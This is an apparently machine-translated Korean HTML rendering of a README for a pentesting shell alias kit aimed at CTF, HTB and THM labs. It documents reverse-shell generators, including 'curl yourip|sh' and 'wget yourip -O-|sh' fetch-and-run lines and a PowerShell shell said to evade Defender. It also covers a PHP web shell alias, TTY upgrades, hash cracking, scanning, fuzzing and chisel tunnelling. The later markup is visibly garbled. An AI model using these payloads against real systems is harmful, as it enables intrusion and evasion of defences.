@@ -1,0 +1,480 @@
+﻿<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>zsh-aliases - 일상적인 작업을 더 쉽게 만들어주는 별칭 및 스크립트입니다.</title>
+    <meta name="description" content="일상적인 작업을 더 쉽게 만들어주는 별칭 및 스크립트입니다.">
+    <meta name="keywords" content="zsh-aliases, Korean, documentation, GitHub, open source">
+    <meta name="author" content="OpenAiTx">
+    <meta name="robots" content="index, follow">
+    
+    <!-- Structured Data -->
+    <script type="application/ld+json">
+    {
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "zsh-aliases",
+  "description": "일상적인 작업을 더 쉽게 만들어주는 별칭 및 스크립트입니다.",
+  "author": {
+    "@type": "Person",
+    "name": "jazzpizazz"
+  },
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "Any",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "aggregateRating": {
+    "@type": "AggregateRating",
+    "ratingValue": "5",
+    "ratingCount": 176
+  },
+  "url": "https://OpenAiTx.github.io/projects/jazzpizazz/zsh-aliases/README-ko.html",
+  "sameAs": "https://raw.githubusercontent.com/jazzpizazz/zsh-aliases/main/README.md",
+  "datePublished": "2026-05-07",
+  "dateModified": "2026-05-07"
+}
+    </script>
+    
+    <!-- GitHub-style CSS -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            line-height: 1.6;
+            color: #24292e;
+            background-color: #ffffff;
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .container {
+            background: #ffffff;
+            border: 1px solid #e1e4e8;
+            border-radius: 6px;
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+        
+        .header {
+            border-bottom: 1px solid #e1e4e8;
+            padding-bottom: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .project-title {
+            font-size: 2em;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .project-title a {
+            color: #24292e;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: color 0.2s ease;
+        }
+        
+        .project-title a:hover {
+            color: #0366d6;
+            text-decoration: none;
+        }
+        
+        .project-title .github-icon {
+            width: 1em;
+            height: 1em;
+            fill: currentColor;
+            opacity: 0.7;
+            transition: opacity 0.2s ease;
+        }
+        
+        .project-title a:hover .github-icon {
+            opacity: 1;
+        }
+        
+        .project-meta {
+            color: #586069;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+        
+        .stars {
+            display: inline-block;
+            margin-right: 16px;
+        }
+        
+        .language {
+            display: inline-block;
+            background-color: #f1f8ff;
+            color: #0366d6;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .content {
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        
+        h1, h2, h3, h4, h5, h6 {
+            margin-top: 24px;
+            margin-bottom: 16px;
+            font-weight: 600;
+            line-height: 1.25;
+            color: #24292e;
+        }
+        
+        h1 { font-size: 2em; border-bottom: 1px solid #eaecef; padding-bottom: 0.3em; }
+        h2 { font-size: 1.5em; border-bottom: 1px solid #eaecef; padding-bottom: 0.3em; }
+        h3 { font-size: 1.25em; }
+        
+        p {
+            margin-bottom: 16px;
+        }
+        
+        code {
+            background-color: #f6f8fa;
+            border-radius: 3px;
+            font-size: 85%;
+            margin: 0;
+            padding: 0.2em 0.4em;
+            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+        }
+        
+        pre {
+            background-color: #f6f8fa;
+            border-radius: 6px;
+            font-size: 85%;
+            line-height: 1.45;
+            overflow: auto;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+        
+        pre code {
+            background-color: transparent;
+            border: 0;
+            display: inline;
+            line-height: inherit;
+            margin: 0;
+            overflow: visible;
+            padding: 0;
+            word-wrap: normal;
+        }
+        
+        a {
+            color: #0366d6;
+            text-decoration: none;
+        }
+        
+        a:hover {
+            text-decoration: underline;
+        }
+        
+        ul, ol {
+            margin-bottom: 16px;
+            padding-left: 2em;
+        }
+        
+        li {
+            margin-bottom: 0.25em;
+        }
+        
+        blockquote {
+            border-left: 4px solid #dfe2e5;
+            color: #6a737d;
+            margin: 0 0 16px 0;
+            padding: 0 1em;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #e1e4e8;
+            color: #586069;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .footer a {
+            color: #0366d6;
+        }
+        
+        .original-link {
+            margin-top: 16px;
+            padding: 12px;
+            background-color: #f6f8fa;
+            border-radius: 6px;
+            border: 1px solid #e1e4e8;
+        }
+        
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            .container {
+                padding: 16px;
+            }
+            
+            .project-title {
+                font-size: 1.5em;
+            }
+        }
+    </style>
+    
+    <!-- Prism.js for syntax highlighting -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+    <!-- Bing Count -->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "sh95yd6uwt");
+    </script>        
+
+    <!-- Statcounter -->
+    <script type="text/javascript">
+        var sc_project = 13142514;
+        var sc_invisible = 1;
+        var sc_security = "d03a31d8"; 
+    </script>
+    <script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
+    <noscript>
+        <div class="statcounter"><a title="Web Analytics" href="https://statcounter.com/" target="_blank"><img
+                    class="statcounter" src="https://c.statcounter.com/13142514/0/d03a31d8/1/" alt="Web Analytics"
+                    referrerPolicy="no-referrer-when-downgrade"></a></div>
+    </noscript>    
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1 class="project-title">
+                <a href="https://github.com/jazzpizazz/zsh-aliases" target="_blank" rel="noopener noreferrer">
+                    <svg class="github-icon" viewBox="0 0 16 16" aria-hidden="true">
+                        <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+                    </svg>
+                    zsh-aliases
+                </a>
+            </h1>
+            <div class="project-meta">
+                <span class="stars">⭐ 176 stars</span>
+                <span class="language">Korean</span>
+                <span>by jazzpizazz</span>
+            </div>
+        </div>
+        
+        <div class="content">
+            <h1>CTF, HTB, THM 등을 위한 도구  </h1>
+자주 사용하는 별칭과 스크립트를 포함합니다. 이 저장소를 <strong>홈 폴더에</strong> 클론한 후 <code>echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc</code>를 실행하세요. zsh를 재시작하면 모든 별칭과 스크립트를 사용할 수 있습니다. 칼리 리눅스에서만 테스트했으며, 다른 배포판에서는 추가 종속성 설치가 필요할 수 있습니다.  
+<blockquote>#### 면책 조항  </blockquote>
+<blockquote>대부분의 별칭은 아마도 형편없을 수 있으니, pepeganess를 줄이는 풀 리퀘스트 제출을 환영합니다. 저에게는 작동하는 것만으로도 충분합니다 :D  </blockquote>
+<h2>기타  </h2>
+<h3>> www  </h3></p><p>현재 디렉토리에서 포트 80으로 HTTP 서버를 시작합니다. 또한 각 네트워크 인터페이스 카드에 연결된 IP 주소 목록을 출력하고, 현재 디렉토리 경로를 보여주며 파일 목록을 나열합니다.  
+예시:
+<pre><code class="language-">┌──(jazz㉿kali)-[/tmp/www]
+└─$ www
+[eth0] 192.168.172.128
+[/tmp/www]
+linpeas.sh  pspy64
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
+<blockquote>#### 노트</blockquote>
+<blockquote>- 포트 80에서 수신할 수 있도록 sudo를 사용합니다.</blockquote></p><h3>> tun0</h3></p><p>tun0 인터페이스의 IP 주소를 클립보드에 복사합니다.
+예시:
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ tun0 </code></pre>
+클립보드 내용 이후:
+<pre><code class="language-">10.10.14.41</code></pre></p><h3>> mkdir_cd</h3>
+디렉토리를 생성한 후 바로 그 디렉토리로 <code>cd</code> 하고 싶을 때가 많습니다. 이것은 정확히 그 작업을 수행합니다.  
+예시: 
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ mkdir_cd pepega</p><p>┌──(jazz㉿kali)-[~/jazz/pepega]
+└─$ </code></pre></p><h2>리버스 셸</h2>
+<h3>> gen_lin_rev $ip $port </h3>
+<a href="https://github.com/lukechilds/reverse-shell" target="_blank" rel="noopener noreferrer">RSaaS</a>를 기반으로 합니다. 현재 디렉터리에 <code>index.html</code> 파일을 생성합니다. 이 파일에는 여러 리버스 셸 페이로드가 포함되어 있으며, 하나가 작동할 때까지 순차적으로 시도됩니다. RCE를 얻은 후 리버스 셸을 쉽게 빠르게 실행하기 위해 <code>www</code>와 함께 사용할 수 있습니다. 대상이 <code>curl yourip|sh</code>를 실행하면 웹서버에서 리버스 셸 페이로드를 가져와 리스너에 연결을 시도합니다. 
+예시: 
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ gen_lin_rev 127.0.0.1 1337
+[+] Wrote Linux reverse shells to /home/jazz/index.html</code></pre>
+<blockquote>#### 노트</blockquote>
+<blockquote>- <code>curl yourip|sh</code> 페이로드가 공백과 파이프를 제외하고는 별다른 나쁜 문자가 없다는 점이 정말 마음에 듭니다. 공백이 문제될 경우 이를 우회하는 <a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces" target="_blank" rel="noopener noreferrer">방법들</a>이 있고, 파이프는 별도로 다운로드 후 실행하여 우회할 수 있습니다.</blockquote>
+<blockquote>- 원격 머신에 curl이 설치되어 있지 않으면 <code>wget yourip -O-|sh</code>를 시도해 볼 수 있습니다.</blockquote>
+ 
+<h3>> gen_php_rev $ip $port</h3></p><p>주어진 ip와 포트로 <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener noreferrer">PentestMonkey PHP 역방향 쉘</a>을 생성하여 현재 디렉토리에 저장합니다.  
+예시:</p><pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ gen_php_rev 127.0.0.1 1337                                                              
+[+] Wrote PHP reverse shell to /home/jazz/jazz.php</code></pre>
+<h3>> gen_ps_rev $ip $port</h3>
+제공된 IP와 포트를 사용하여 Powershell 리버스 셸을 생성하며, 마지막 사용 시점에 디펜더를 우회했습니다. 이 페이로드의 출처는 확실하지 않습니다.  
+예시:
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ gen_ps_rev 127.0.0.1 1337</code></pre>
+클립보드 내용 이후:
+<pre><code class="language-">powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...</code></pre></p><h2>TTY 업그레이드</h2>
+<h3>> uptty</h3>
+python(2) 및 python3 tty 업그레이드 명령어를 클립보드에 복사합니다.
+예시: 
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ uptty</code></pre>
+클립보드 내용 이후:
+<pre><code class="language-">python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+<blockquote>#### 참고사항</blockquote>
+<blockquote>- <code>xclip</code> 설치가 필요합니다</blockquote>
+<blockquote>- <code>py_tty_upgrade</code>와 <code>py3_tty_upgrade</code>는 현재까지 포함되어 있으나 대신 이 별칭을 호출합니다</blockquote></p><h3>> script_tty_upgrade</h3>
+원격 머신에 Python이 설치되어 있지 않은 경우 이 명령어를 사용하여 tty 셸로 업그레이드하는 <code>script</code> 방법을 클립보드에 복사할 수 있습니다. 
+예시:
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ script_tty_upgrade</code></pre>
+클립보드 내용 이후:
+<pre><code class="language-">/usr/bin/script -qc /bin/bash /dev/null</code></pre>
+<blockquote>#### 노트</blockquote>
+<blockquote>- <code>xclip</code> 설치가 필요합니다</blockquote></p><h3>> tty_fix</h3>
+<code>stty raw -echo; fg; reset</code> 명령어를 실행하며, 위의 tty 업그레이드를 사용한 후에 사용해야 합니다.</p><h3>> tty_conf</h3>
+현재 tty 설정(행과 열 수)을 가져와서 클립보드에 복사하는 원라이너를 제공합니다. 이를 리버스 셸 창에 바로 붙여넣으면 해당 설정과 일치시킬 수 있습니다. 이 방법은 터미널에서 줄 바꿈이 중간에 발생하는 문제를 해결합니다.  
+예시:
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ tty_conf               </code></pre>
+클립보드 내용 이후:
+<pre><code class="language-">stty rows 30 columns 116</code></pre>
+<blockquote>#### 노트</blockquote>
+<blockquote>- <code>xclip</code> 설치 필요</blockquote></p><h2>해시 크래킹</h2>
+<h3>> rock_john $hash_file (추가 인자)</h3>
+수동으로 <code>--wordlist=/usr/share/wordlists/rockyou.txt</code> (자동 완성 불가 :/)를 인자로 제공하는 대신, 이 별칭은 해당 인자를 주입하여 JohnTheRipper와 rockyou 단어 목록을 사용해 해시를 더 쉽게 크래킹하는 데 사용할 수 있습니다.
+예시:
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ rock_john hash.txt --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+jazz             (?)     
+1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.</code></pre>
+<blockquote>#### 노트</blockquote>
+<blockquote>- Kali는 2022.2 버전에서 John의 자동 완성을 수정한 것 같습니다! 이 별칭은 여전히 약간의 수고를 덜어줍니다 ;)</blockquote>
+<h2>포트스캐닝</h2>
+<h3>> nmap_tcp $ip (추가 인자)</h3>
+기본 설정으로 TCP nmap 스캔을 시작하고 스캔 결과를 nmap 디렉터리에 출력합니다. 디렉터리가 없으면 자동으로 생성됩니다.
+예시:
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ nmap_default 127.0.0.1
+[i] Creating /home/jazz/nmap...
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT
+...</code></pre>
+<blockquote>#### 참고사항</blockquote>
+<blockquote>- 기본 TCP 포트만 스캔합니다. 모든 포트를 스캔하려면 <code>-p-</code>를 인수로 추가하세요.</blockquote>
+<blockquote>- SYN 스캔에 필요한 권한을 얻기 위해 <code>sudo</code>를 사용합니다.</blockquote>
+<h3>> nmap_udp $ip (추가 인수)</h3>
+기본 설정으로 UDP nmap 스캔을 시작하며, 스캔 결과를 nmap 디렉터리에 출력합니다. 해당 디렉터리가 없으면 자동으로 생성됩니다. 
+예시:
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ nmap_udp 127.0.0.1
+[i] Creating /home/jazz/nmap...
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
+...</code></pre>
+<blockquote>#### 참고 사항</blockquote>
+<blockquote>- 이것은 기본 UDP 포트만 스캔합니다. 모든 포트를 스캔하려면 <code>-p-</code>를 인수로 추가하세요.</blockquote>
+<blockquote>- UDP 스캔에 필요한 권한을 얻기 위해 <code>sudo</code>를 사용합니다.</blockquote></p><h2>SecLists 경로</h2></p><blockquote>#### 참고 사항</blockquote>
+<blockquote>- 이 툴킷의 많은 기능이 SecLists 프로젝트의 워드리스트를 사용합니다. 이 기능들이 올바르게 작동하려면 스크립트가 SecLists 디렉터리 위치를 알아야 합니다. 툴킷은 SecLists 위치를 찾기 위해 다음 논리를 사용합니다:</blockquote></p><ul><li>먼저 <code>/opt/seclists/</code>가 존재하는지 확인합니다.</li>
+<li>없다면 <code>/usr/share/seclists/</code>가 존재하는지 확인합니다.</li>
+<li>이 두 디렉터리 모두 없으면 <code>SECLISTS_PATH</code>라는 환경 변수를 찾습니다.</li></p><p></ul>이 스크립트와 함께 SecLists를 설정하려면:</p><ul><li>표준 위치 중 하나(<code>/opt/seclists/</code> 또는 <code>/usr/share/seclists/</code>)에 SecLists를 설치합니다.</li>
+   
+   </ul>또는</p><ul><li><code>SECLISTS_PATH</code> 환경 변수를 SecLists 설치 경로로 설정합니다:</li></p><p>   </ul><pre><code class="language-bash">   export SECLISTS_PATH="/path/to/seclists"
+   # You can add this line to your .zshrc file to make it permanent.
+    ``<code></p><h2>웹 퍼징</h2>
+<h3>> vhost $domain (-w 단어목록) (추가 인자)</h3>
+ffuf를 사용하여 가상 호스트 탐색을 수행합니다.
+예시:</code></pre>
+┌──(22sh㉿kali)-[~]
+└─$ vhost box.htb
+<pre><code class="language-">> #### 노트
+<blockquote>- 도메인만 전달하면 http가 사용되며, https를 위해 전체 URL https://box.htb도 전달할 수 있습니다.</blockquote>
+<blockquote>- </code>ffuf<code>가 설치되어 있어야 합니다.</blockquote>
+<h3>> fuzz_dir $url (추가 인수)</h3>
+ffuf를 사용하여 디렉토리 및 파일 퍼징을 수행합니다.
+예제:</code></pre>
+┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb</p><p>┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt</p><p>┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -fs 245</p><p>┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245
+<pre><code class="language-">> #### 노트
+<blockquote>- </code>ffuf<code>가 설치되어 있어야 합니다</blockquote>
+<h2>Chisel 터널링</h2>
+<h3>> chisel_socks $ip $port</h3>
+Chisel을 사용하여 SOCKS 프록시를 설정하고 명령어를 클립보드에 복사합니다.
+예시:
+</code></pre>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ chisel_socks 10.10.14.10 8888
+[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
+2024/08/05 23:31:03 server: Reverse tunnelling enabled
+2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=
+2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888
+<pre><code class="language-">### > chisel_forward $local_ip $local_port $remote_ip $remote_port
+Chisel을 사용하여 포트 포워딩을 설정합니다.
+예:
+</code></pre>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080
+[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080
+[+] Run this on the target machine
+2024/08/05 23:32:30 server: Reverse tunnelling enabled
+2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=
+2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888
+<pre><code class="language-">## 호스트 관리
+<h3>> addhost $ip $hostname</h3>
+/etc/hosts 파일에 항목을 추가하거나 업데이트합니다.
+예시:</code></pre>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ addhost 10.10.11.234 big.box.htb 
+[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts
+10.10.11.234 boss.htb big.boss.htb big.box.htb</p><p>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ addhost 10.10.11.235 newbox.htb 
+[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts
+10.10.11.235 newbox.htb
+</code>`<code>
+<h2>추가 별칭</h2>
+<ul><li></code>linpeas<code>: 최신 버전의 LinPEAS를 다운로드합니다.</li>
+<li></code>upload<code>: bashupload.com을 사용하여 파일을 업로드합니다.</li>
+<li></code>phpcmd<code>: 간단한 PHP 웹 셸을 생성합니다.</li>
+<li></code>burl`: burpsuite 프록시를 사용하여 curl을 실행합니다.</li></p><p>
+
+</ul>---
+
+Tranlated By <a href="https://github.com/OpenAiTx/OpenAiTx" target="_blank" rel="noopener noreferrer">Open Ai Tx</a> | Last indexed: 2026-05-07
+
+---</p>
+        </div>
+        
+        <div class="original-link">
+            <strong>Original README:</strong> <a href="https://raw.githubusercontent.com/jazzpizazz/zsh-aliases/main/README.md" target="_blank" rel="noopener noreferrer">View on GitHub</a>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>Translated by <a href="https://github.com/OpenAiTx/OpenAiTx" target="_blank" rel="noopener noreferrer">OpenAiTx</a> | 
+        Last updated: 2026-05-07 
+    </div>
+    
+</body>
+</html>
